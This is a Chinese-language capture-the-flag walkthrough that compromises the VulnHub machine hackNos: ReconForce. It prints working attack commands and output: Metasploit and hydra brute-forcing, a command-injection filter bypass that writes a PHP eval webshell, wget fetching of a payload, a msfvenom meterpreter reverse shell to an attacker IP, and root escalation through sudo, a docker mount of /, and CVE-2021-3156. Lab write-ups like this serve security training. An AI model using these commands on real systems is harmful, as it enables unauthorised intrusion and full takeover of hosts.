# vulnhub靶机 ReconForce

靶机地址[hackNos: ReconForce (v1.1) ~ VulnHub](https://www.vulnhub.com/entry/hacknos-reconforce,416/)

目标为user.txt和root.txt

## 靶机配置

将靶机下载好后。在VM中选择打开虚拟机，在开启虚拟机之前，网络设置中调整为nat（与攻击机kali一个网段）。

## 渗透测试

### 使用nmap进行扫描

```
└─# nmap -p- -sV -sT -T4 192.168.5.132
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-24 17:23 CST
Nmap scan report for 192.168.5.132
Host is up (0.0012s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 00:0C:29:48:11:36 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds

```



### 目录扫描

```
└─# dirsearch -u "http://192.168.5.132" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220520

Output File: /root/.dirsearch/reports/192.168.5.132/_21-09-17_09-25-26.txt

Error Log: /root/.dirsearch/logs/errors-21-09-17_09-25-26.log

Target: http://192.168.5.132/

[09:25:27] Starting: 
[09:25:27] 301 -  312B  - /css  ->  http://192.168.5.132/css/
[09:27:52] 403 -  278B  - /server-status                                                                                        
                                                                                                                                                                                                            
Task Completed
```

那么访问主页。点击中间的TroubleShoot，会发现一个登录，并且URL变为```http://192.168.5.132/5ecure/```

![image-20210917093327531](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917093327531.png)

![image-20210917101742393](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917101742393.png)

上面的文字为```is requesting your username and password. The site says: “Recon Security```



### 尝试ftp匿名登录

```
└─# ftp 192.168.5.132
Connected to 192.168.5.132.
220 "Security@hackNos".
Name (192.168.5.132:root): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.

```

发现一个```Security@hackNos```

那么写一个字典,前面的随意。主要是要用用工具来爆破。

```
└─# cat passrecon                                                                                           
Security@h
admin
asdf
qwer
aaaa
Security@hackNos
```

### 使用msf进行http登录爆破

```
└─# msfconsole                                            
                                                  

Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046                                                                                                                                                                                                   
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001                                                                                                                                                            
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60                                                                                                                                                            
ds: 0018   es: 0018  ss: 0018                                                                                                                                                                                      
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)                                                                                                                                                        
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
Stack: 90909090990909090990909090                                                                                                                                                                                  
       90909090990909090990909090                                                                                                                                                                                  
       90909090.90909090.90909090                                                                                                                                                                                  
       90909090.90909090.90909090                                                                                                                                                                                  
       90909090.90909090.09090900                                                                                                                                                                                  
       90909090.90909090.09090900                                                                                                                                                                                  
       ..........................                                                                                                                                                                                  
       cccccccccccccccccccccccccc                                                                                                                                                                                  
       cccccccccccccccccccccccccc                                                                                                                                                                                  
       ccccccccc.................                                                                                                                                                                                  
       cccccccccccccccccccccccccc                                                                                                                                                                                  
       cccccccccccccccccccccccccc                                                                                                                                                                                  
       .................ccccccccc                                                                                                                                                                                  
       cccccccccccccccccccccccccc                                                                                                                                                                                  
       cccccccccccccccccccccccccc                                                                                                                                                                                  
       ..........................                                                                                                                                                                                  
       ffffffffffffffffffffffffff                                                                                                                                                                                  
       ffffffff..................                                                                                                                                                                                  
       ffffffffffffffffffffffffff                                                                                                                                                                                  
       ffffffff..................                                                                                                                                                                                  
       ffffffff..................                                                                                                                                                                                  
       ffffffff..................                                                                                                                                                                                  
                                                                                                                                                                                                                   

Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing                                                                                                                                                                                      


       =[ metasploit v6.0.48-dev                          ]
+ -- --=[ 2141 exploits - 1139 auxiliary - 365 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: When in a module, use back to go 
back to the top level prompt

[*] Starting persistent handler(s)...
msf6 > search http_login

Matching Modules
================

   #  Name                                                     Disclosure Date  Rank    Check  Description
   -  ----                                                     ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/dlink_dir_300_615_http_login                       normal  No     D-Link DIR-300A / DIR-320 / DIR-615D HTTP Login Utility
   1  auxiliary/scanner/http/dlink_dir_session_cgi_http_login                   normal  No     D-Link DIR-300B / DIR-600B / DIR-815 / DIR-645 HTTP Login Utility
   2  auxiliary/scanner/http/dlink_dir_615h_http_login                          normal  No     D-Link DIR-615H HTTP Login Utility
   3  auxiliary/scanner/http/http_login                                         normal  No     HTTP Login Utility
   4  auxiliary/scanner/vmware/vmware_http_login                                normal  No     VMWare Web Login Scanner


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/vmware/vmware_http_login

msf6 > use 3
msf6 auxiliary(scanner/http/http_login) > show options 

Module options (auxiliary/scanner/http/http_login):

   Name              Current Setting                                                           Required  Description
   ----              ---------------                                                           --------  -----------
   AUTH_URI                                                                                    no        The URI to authenticate against (default:auto)
   BLANK_PASSWORDS   false                                                                     no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                         yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                     no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                     no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                     no        Add all users in the current database to the list
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   REQUESTTYPE       GET                                                                       no        Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)
   RHOSTS                                                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             80                                                                        yes       The target port (TCP)
   SSL               false                                                                     no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                     yes       Stop guessing when a credential works for a host
   THREADS           1                                                                         yes       The number of concurrent threads (max one per host)
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                     no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                      yes       Whether to print output for all attempts
   VHOST                                                                                       no        HTTP server virtual host

msf6 auxiliary(scanner/http/http_login) > set pass_file /root/cve/passrecon
pass_file => /root/cve/passrecon
msf6 auxiliary(scanner/http/http_login) > set auth_uri /5ecure/
auth_uri => /5ecure/
msf6 auxiliary(scanner/http/http_login) > set rhosts 192.168.5.132
rhosts => 192.168.5.132
msf6 auxiliary(scanner/http/http_login) > exploit 

[*] Attempting to login to http://192.168.5.132:80/5ecure/
[-] 192.168.5.132:80 - Failed: 'admin:Security@h'
[!] No active DB -- Credential data will not be saved!
[-] 192.168.5.132:80 - Failed: 'admin:admin'
[-] 192.168.5.132:80 - Failed: 'admin:asdf'
[-] 192.168.5.132:80 - Failed: 'admin:qwer'
[-] 192.168.5.132:80 - Failed: 'admin:aaaa'
[+] 192.168.5.132:80 - Success: 'admin:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'manager:Security@h'
[-] 192.168.5.132:80 - Failed: 'manager:admin'
[-] 192.168.5.132:80 - Failed: 'manager:asdf'
[-] 192.168.5.132:80 - Failed: 'manager:qwer'
[-] 192.168.5.132:80 - Failed: 'manager:aaaa'
[-] 192.168.5.132:80 - Failed: 'manager:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'root:Security@h'
[-] 192.168.5.132:80 - Failed: 'root:admin'
[-] 192.168.5.132:80 - Failed: 'root:asdf'
[-] 192.168.5.132:80 - Failed: 'root:qwer'
[-] 192.168.5.132:80 - Failed: 'root:aaaa'
[-] 192.168.5.132:80 - Failed: 'root:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'cisco:Security@h'
[-] 192.168.5.132:80 - Failed: 'cisco:admin'
[-] 192.168.5.132:80 - Failed: 'cisco:asdf'
[-] 192.168.5.132:80 - Failed: 'cisco:qwer'
[-] 192.168.5.132:80 - Failed: 'cisco:aaaa'
[-] 192.168.5.132:80 - Failed: 'cisco:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'apc:Security@h'
[-] 192.168.5.132:80 - Failed: 'apc:admin'
[-] 192.168.5.132:80 - Failed: 'apc:asdf'
[-] 192.168.5.132:80 - Failed: 'apc:qwer'
[-] 192.168.5.132:80 - Failed: 'apc:aaaa'
[-] 192.168.5.132:80 - Failed: 'apc:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'pass:Security@h'
[-] 192.168.5.132:80 - Failed: 'pass:admin'
[-] 192.168.5.132:80 - Failed: 'pass:asdf'
[-] 192.168.5.132:80 - Failed: 'pass:qwer'
[-] 192.168.5.132:80 - Failed: 'pass:aaaa'
[-] 192.168.5.132:80 - Failed: 'pass:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'security:Security@h'
[-] 192.168.5.132:80 - Failed: 'security:admin'
[-] 192.168.5.132:80 - Failed: 'security:asdf'
[-] 192.168.5.132:80 - Failed: 'security:qwer'
[-] 192.168.5.132:80 - Failed: 'security:aaaa'
[-] 192.168.5.132:80 - Failed: 'security:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'user:Security@h'
[-] 192.168.5.132:80 - Failed: 'user:admin'
[-] 192.168.5.132:80 - Failed: 'user:asdf'
[-] 192.168.5.132:80 - Failed: 'user:qwer'
[-] 192.168.5.132:80 - Failed: 'user:aaaa'
[-] 192.168.5.132:80 - Failed: 'user:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'system:Security@h'
[-] 192.168.5.132:80 - Failed: 'system:admin'
[-] 192.168.5.132:80 - Failed: 'system:asdf'
[-] 192.168.5.132:80 - Failed: 'system:qwer'
[-] 192.168.5.132:80 - Failed: 'system:aaaa'
[-] 192.168.5.132:80 - Failed: 'system:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'sys:Security@h'
[-] 192.168.5.132:80 - Failed: 'sys:admin'
[-] 192.168.5.132:80 - Failed: 'sys:asdf'
[-] 192.168.5.132:80 - Failed: 'sys:qwer'
[-] 192.168.5.132:80 - Failed: 'sys:aaaa'
[-] 192.168.5.132:80 - Failed: 'sys:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'wampp:Security@h'
[-] 192.168.5.132:80 - Failed: 'wampp:admin'
[-] 192.168.5.132:80 - Failed: 'wampp:asdf'
[-] 192.168.5.132:80 - Failed: 'wampp:qwer'
[-] 192.168.5.132:80 - Failed: 'wampp:aaaa'
[-] 192.168.5.132:80 - Failed: 'wampp:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'newuser:Security@h'
[-] 192.168.5.132:80 - Failed: 'newuser:admin'
[-] 192.168.5.132:80 - Failed: 'newuser:asdf'
[-] 192.168.5.132:80 - Failed: 'newuser:qwer'
[-] 192.168.5.132:80 - Failed: 'newuser:aaaa'
[-] 192.168.5.132:80 - Failed: 'newuser:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'xampp-dav-unsecure:Security@h'
[-] 192.168.5.132:80 - Failed: 'xampp-dav-unsecure:admin'
[-] 192.168.5.132:80 - Failed: 'xampp-dav-unsecure:asdf'
[-] 192.168.5.132:80 - Failed: 'xampp-dav-unsecure:qwer'
[-] 192.168.5.132:80 - Failed: 'xampp-dav-unsecure:aaaa'
[-] 192.168.5.132:80 - Failed: 'xampp-dav-unsecure:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'vagrant:Security@h'
[-] 192.168.5.132:80 - Failed: 'vagrant:admin'
[-] 192.168.5.132:80 - Failed: 'vagrant:asdf'
[-] 192.168.5.132:80 - Failed: 'vagrant:qwer'
[-] 192.168.5.132:80 - Failed: 'vagrant:aaaa'
[-] 192.168.5.132:80 - Failed: 'vagrant:Security@hackNos'
[-] 192.168.5.132:80 - Failed: 'connect:connect'
[-] 192.168.5.132:80 - Failed: 'sitecom:sitecom'
[-] 192.168.5.132:80 - Failed: 'cisco:cisco'
[-] 192.168.5.132:80 - Failed: 'cisco:sanfran'
[-] 192.168.5.132:80 - Failed: 'private:private'
[-] 192.168.5.132:80 - Failed: 'wampp:xampp'
[-] 192.168.5.132:80 - Failed: 'newuser:wampp'
[-] 192.168.5.132:80 - Failed: 'xampp-dav-unsecure:ppmax2011 '
[-] 192.168.5.132:80 - Failed: 'vagrant:vagrant'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

爆破得到结果```[+] 192.168.5.132:80 - Success: 'admin:Security@hackNos'```

登录进去后发现可以命令执行

![image-20210917113232578](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917113232578.png)

![image-20210917113245270](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917113245270.png)

使用burp suite 发送命令查看out.php

![image-20210917113723514](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917113723514.png)

```
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?> 
```

由于用于过滤的数组编写有一定的问题

```
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',//这里是|加上一个空格
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
```

即```127.0.0.1| id```被拦截而```127.0.0.1|id```不被拦截

那么直接用```|```不加空格就可以绕过过滤

直接写入一句话```127.0.0.1|echo "<?php @eval($_POST['qwer']);?>" >> php.php```

![image-20210917140159617](C:\Users\10607\AppData\Roaming\Typora\typora-user-images\image-20210917140159617.png)

发现菜刀蚁剑等webshell无法连接



### 使用msf生成后门反弹shell

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1234 R > pwn1234.php
```

使用wget将木马传输到目标主机

```
ip=127.0.0.1|wget http://192.168.56.102/shell.php&Submit=Ping_Scan
```



使用msf监听，并在浏览器中访问pwn1234.php，得到一个meterpreter shell

```
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 0.0.0.0:1234 
[*] Sending stage (39282 bytes) to 192.168.5.132
[*] Meterpreter session 1 opened (192.168.5.129:1234 -> 192.168.5.132:51424) at 2021-09-17 15:11:04 +0800
meterpreter > 
```



切换shell

```
meterpreter > shell
Process 3357 created.
Channel 0 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@hacknos:/var/www/recon/5ecure$
```

获取user.txt

```
www-data@hacknos:/var/www$ cat /home/recon/user.txt
cat /home/recon/user.txt
###########################################

MD5HASH: bae11ce4f67af91fa58576c1da2aad4b

```

获取/etc/passwd

```
www-data@hacknos:/var/www/recon/5ecure$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin
tcpdump:x:107:112::/nonexistent:/usr/sbin/nologin
landscape:x:108:114::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
recon:x:1000:119:rahul:/home/recon:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:111:117:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin

```

发现recon用户

### 使用hydra爆破ssh口令（这里只是想用一下hydra，密码字典还是passrecon）

```
└─# cat passrecon                                                                                           
Security@h
admin
asdf
qwer
aaaa
Security@hackNos

└─# hydra -l recon -P passrecon ssh://192.168.5.132 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-17 22:07:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:1/p:6), ~1 try per task
[DATA] attacking ssh://192.168.5.132:22/
[22][ssh] host: 192.168.5.132   login: recon   password: Security@hackNos
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-17 22:07:55

```

获得口令```Security@hackNos```

ssh 登录```recon```，并且查看sudo权限，发现拥有密码可以执行任何程序

```
└─# ssh recon@192.168.5.132         
The authenticity of host '192.168.5.132 (192.168.5.132)' can't be established.
ECDSA key fingerprint is SHA256:YyrsJ6SfcrEjupojYvAzzhetfPVnVVv4XDFAoaf2FGw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.5.132' (ECDSA) to the list of known hosts.
recon@192.168.5.132's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 17 Sep 2021 02:09:16 PM UTC

  System load:  0.05              Processes:            154
  Usage of /:   35.3% of 9.22GB   Users logged in:      0
  Memory usage: 11%               IP address for ens33: 192.168.5.132
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

31 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflife

New release '20.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Fri Jan 10 23:05:02 2020 from 192.168.0.104
recon@hacknos:~$ sudo -l
[sudo] password for recon: 
Matching Defaults entries for recon on hacknos:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User recon may run the following commands on hacknos:
    (ALL : ALL) ALL

```

### 直接切换用户到root

```
recon@hacknos:~$ sudo su -
root@hacknos:~# Security@hackNos
Security@hackNos: command not found
root@hacknos:~# ls
root.txt  snap
root@hacknos:~# id
uid=0(root) gid=0(root) groups=0(root)
root@hacknos:~# cat root.txt
     $$\          $$$$$$$\                                          
     \$$\         $$  __$$\                                         
$$$$\ \$$\        $$ |  $$ | $$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$$\  
\____| \$$\       $$$$$$$  |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ 
$$$$\  $$  |      $$  __$$< $$$$$$$$ |$$ /      $$ /  $$ |$$ |  $$ |
\____|$$  /       $$ |  $$ |$$   ____|$$ |      $$ |  $$ |$$ |  $$ |
     $$  /        $$ |  $$ |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |  $$ |
     \__/         \__|  \__| \_______| \_______| \______/ \__|  \__|
                                                                    
                                                                    
                                                                    

MD5HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

WebBlog: www.hackNos.com

Twitter: @rahul_gehlaut
```





### 在用户recon身份提权方法二

使用工具查找可利用文件

https://github.com/rebootuser/LinEnum

```
[-] Any interesting mail in /var/mail:
total 8
drwxrwsr-x  2 root mail 4096 Oct 17  2019 .
drwxr-xr-x 14 root root 4096 Jan  6  2020 ..


[+] Looks like we're hosting Docker:
Docker version 19.03.2, build 6a30dfca03


### SCAN COMPLETE ####################################
```

发现可以利用docker提权

```
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -it -v /:/mbt IMAGE ID
cd /mbt
cat /root/root.txt
```

具体操作

```
recon@hacknos:~$ docker images

REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
recon@hacknos:~$ 
recon@hacknos:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
a0d0a0d46f8b: Pull complete 
Digest: sha256:e1c082e3d3c45cccac829840a25941e679c25d438cc8412c2fa221cf1a824e6a
Status: Downloaded newer image for alpine:latest
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)

# # exit
recon@hacknos:~$ docker run -it -v /:/mbt e7d92cdc71fe
Unable to find image 'e7d92cdc71fe:latest' locally
docker: Error response from daemon: pull access denied for e7d92cdc71fe, repository does not exist or may require 'docker login': denied: requested access to the resource is denied.
See 'docker run --help'.
recon@hacknos:~$ docker iamges
docker: 'iamges' is not a docker command.
See 'docker --help'
recon@hacknos:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              14119a10abf4        2 weeks ago         5.6MB
recon@hacknos:~$ docker run -it -v /:/mbt 14119a10abf4
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # ls
bin    dev    etc    home   lib    mbt    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
/ # cd root/
~ # ls
~ # cd ..
/ # cd /mbt
/mbt # ls
bin             dev             initrd.img      lib32           lost+found      opt             run             srv             usr             vmlinuz.old
boot            etc             initrd.img.old  lib64           media           proc            sbin            sys             var
cdrom           home            lib             libx32          mnt             root            snap            tmp             vmlinuz
/mbt # cd root
/mbt/root # ls
root.txt  snap
/mbt/root # cat root
cat: can't open 'root': No such file or directory
/mbt/root # cat root.txt
     $$\          $$$$$$$\                                          
     \$$\         $$  __$$\                                         
$$$$\ \$$\        $$ |  $$ | $$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$$\  
\____| \$$\       $$$$$$$  |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ 
$$$$\  $$  |      $$  __$$< $$$$$$$$ |$$ /      $$ /  $$ |$$ |  $$ |
\____|$$  /       $$ |  $$ |$$   ____|$$ |      $$ |  $$ |$$ |  $$ |
     $$  /        $$ |  $$ |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |  $$ |
     \__/         \__|  \__| \_______| \_______| \______/ \__|  \__|
                                                                    
                                                                    
                                                                    

MD5HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

WebBlog: www.hackNos.com

Twitter: @rahul_gehlaut
/mbt/root # 
```



### 在www-data身份的提权（CVE-2021-3156）

使用https://github.com/mzet-/linux-exploit-suggester进行查找相关提权方式

```
www-data@hacknos:/var/www/recon/5ecure$ ./exp.sh
./exp.sh

Available information:

Kernel version: 5.3.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 19.10
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

78 kernel space exploits
48 user space exploits

Possible Exploits:

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

```

这里使用[worawit/CVE-2021-3156: Sudo Baron Samedit Exploit (github.com)](https://github.com/worawit/CVE-2021-3156)

查看README.md

```
For Linux distribution that glibc has no tcache support:

if a target is Debian 9, Ubuntu 16.04, or Ubuntu 14.04, try exploit_nss_xxx.py for specific version first
next, try exploit_defaults_mailer.py. If you know a target sudo is compiled with --disable-root-mailer, you can skip this exploit. The exploit attempt to check root mailer flag from sudo binary. But sudo permission on some Linux distribution is 4711 (-rws--x--x) which is impossible to check on target system. (Known work OS is CentOS 6 and 7)
last, try exploit_userspec.py
```

然我们先尝试```exploit_nss.py```，提权成功，获取root权限

```
www-data@hacknos:/var/www/recon/5ecure$ ./exploit_nss.py
./exploit_nss.py
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cat /root/root.txt
cat /root/root.txt
     $$\          $$$$$$$\                                          
     \$$\         $$  __$$\                                         
$$$$\ \$$\        $$ |  $$ | $$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$$\  
\____| \$$\       $$$$$$$  |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ 
$$$$\  $$  |      $$  __$$< $$$$$$$$ |$$ /      $$ /  $$ |$$ |  $$ |
\____|$$  /       $$ |  $$ |$$   ____|$$ |      $$ |  $$ |$$ |  $$ |
     $$  /        $$ |  $$ |\$$$$$$$\ \$$$$$$$\ \$$$$$$  |$$ |  $$ |
     \__/         \__|  \__| \_______| \_______| \______/ \__|  \__|
                                                                    
                                                                    
                                                                    

MD5HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

WebBlog: www.hackNos.com

Twitter: @rahul_gehlaut

```



# 注意事项

若是webshell无法直接连接，可以尝试用msf进行反弹。meterpreter传输文件也比较方便。
